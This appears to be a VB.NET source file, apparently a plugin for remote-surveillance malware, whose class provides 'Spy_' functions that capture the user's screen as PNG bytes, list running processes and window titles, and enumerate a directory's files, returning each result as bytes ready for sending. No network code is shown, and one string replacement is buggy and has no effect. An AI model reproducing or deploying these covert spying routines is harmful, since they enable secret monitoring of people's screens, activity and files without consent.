Imports System.Windows.Forms.Screen, System.Drawing
Public Class Class1
    Public Shared Function Spy_Screen(ByVal s As String) As Byte()
        Dim bounds As Rectangle
        Dim screenshot As System.Drawing.Bitmap
        Dim graph As Graphics
        bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds
        screenshot = New System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
        graph = Graphics.FromImage(screenshot)
        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
        Dim mem As New IO.MemoryStream
        screenshot.Save(mem, System.Drawing.Imaging.ImageFormat.Png)
        Dim p As Byte() = mem.ToArray
        mem.Close()
        Return p
    End Function


    Public Shared Function Spy_Process(ByVal s As String) As Byte()
        Dim j As String = Nothing
        For Each x As Process In Process.GetProcesses
            j &= "Process Name : " & x.ProcessName & vbTab
            j &= "Main Window Title : " & x.MainWindowTitle & vbTab
            j &= "File Name : " & x.StartInfo.FileName & vbTab
            j &= vbNewLine
        Next
        Return System.Text.Encoding.Default.GetBytes(j)
    End Function
    Public Shared Function Spy_Files(ByVal s As String) As Byte()
        Dim j As String = Nothing
        Dim a = My.Computer.FileSystem.GetFiles(s)
        For Each x As String In My.Computer.FileSystem.GetDirectories(s)
            Dim o As New IO.FileInfo(x)
            j &= "File Name : " & x & vbTab
            j &= "File Type : " & "Folder" & vbTab
            j &= "File Size : " & o.Length & vbTab
            j &= "last Write : " & o.LastWriteTimeUtc & vbTab
            j &= vbNewLine
        Next
        For Each x As String In a
            Dim o As New IO.FileInfo(x)
            j &= "File Name : " & x & vbTab
            j &= "File Type : " & o.Extension & vbTab
            j &= "File Size : " & o.Length & vbTab
            j &= "last Write : " & o.LastWriteTimeUtc & vbTab
            j &= vbNewLine
        Next
       
        If j.ToLower.Contains("png") Then
            j.Replace("png", "[IVsongokuDZ]")
        End If
        Return System.Text.Encoding.Default.GetBytes(j)
    End Function
End Class
